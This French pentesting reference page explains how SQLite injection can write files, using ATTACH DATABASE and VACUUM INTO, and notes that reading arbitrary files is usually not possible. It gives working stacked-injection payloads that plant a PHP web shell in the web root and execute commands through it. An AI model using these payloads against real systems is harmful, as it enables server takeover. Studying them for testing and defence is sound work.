---
order: 5
title: "Écrire des fichiers via l'injection SQLite"
description: "Primitives d'écriture de fichiers SQLite depuis une injection : ATTACH DATABASE pour créer un fichier et VACUUM INTO pour en copier un, et pourquoi la lecture arbitraire de fichiers n'est généralement pas disponible."
keywords:
  - ATTACH DATABASE
  - VACUUM INTO
  - écriture de fichier SQLite
  - webshell
  - base de données fichier
---

# Manipulation de fichiers

Les capacités de SQLite sur les fichiers sont plus étroites que celles des moteurs serveur, mais l'écriture reste atteignable et mène à l'exécution de code via la couche web.

`ATTACH DATABASE` ouvre (en le créant s'il est absent) un fichier de base de données à un chemin choisi. Là où l'API l'autorise, cela écrit un fichier sur le disque :

```sql
' ; ATTACH DATABASE '/var/www/html/s.php' AS s-- 
```

Le fichier créé commence par l'en-tête `SQLite format 3`, donc ce n'est pas du contenu purement choisi par l'attaquant, mais cela n'empêche pas un web shell : PHP ignore les octets en dehors de `<?php ... ?>`, donc créer dans la base attachée une table dont le contenu contient du code PHP produit un fichier que le moteur PHP exécutera à la requête :

```sql
' ; ATTACH DATABASE '/var/www/html/s.php' AS s; CREATE TABLE s.p(c text); INSERT INTO s.p VALUES('<?php system($_GET[0]); ?>')-- 
```

Requêter `/s.php?0=id` exécute alors des commandes. `VACUUM INTO 'file'` (SQLite 3.27+) écrit une copie propre de la base vers un chemin, une autre primitive d'écriture. Les deux voies d'écriture nécessitent une exécution empilée (une API telle que `sqlite3_exec`) et la permission d'écriture du processus à la destination.

Lire des fichiers arbitraires de l'hôte n'est généralement pas possible : SQLite n'a pas d'équivalent de `LOAD_FILE`, et `ATTACH` ne lit que des fichiers de base de données SQLite valides. La manipulation de fichiers contre SQLite est donc surtout une voie d'écriture vers la racine web menant à un shell, sur laquelle s'appuie la page remote-code-execution, plutôt qu'une primitive de divulgation de fichiers.

## Outils

- **sqlmap** : automatise les écritures de fichiers `ATTACH` empilées là où l'API l'autorise.
- **sqlite3** : la CLI du moteur pour tester les écritures `ATTACH DATABASE` et `VACUUM INTO`.
- Tests manuels avec Burp Repeater et le client sqlite3.

## Références

- Documentation SQLite : ATTACH DATABASE, VACUUM INTO
- OWASP Testing Guide: Testing for SQL Injection
